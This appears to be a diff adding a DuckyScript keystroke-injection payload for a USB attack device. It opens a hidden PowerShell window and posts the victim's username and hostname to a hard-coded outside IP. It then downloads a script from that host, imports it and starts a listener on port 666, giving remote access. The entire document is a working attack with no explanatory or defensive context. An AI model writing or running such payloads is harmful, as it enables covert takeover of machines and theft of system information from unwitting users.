@@ -1,0 +1,19 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -w Hidden
+ENTER
+DELAY 2000
+STRING $url='http://180.239.103.195:8081/ReadyToConnect/' + $(whoami) + '/' + $(hostname)
+ENTER
+STRING Invoke-WebRequest -Uri $url -Method POST
+ENTER
+DELAY 100
+STRING Invoke-WebRequest -Uri 'http://180.239.103.195:8081/Server.ps1' -OutFile 'Server.ps1'
+ENTER
+DELAY 100
+STRING Import-Module .\Server.ps1
+ENTER
+DELAY 100
+STRING Power-listener -port 666
+ENTER
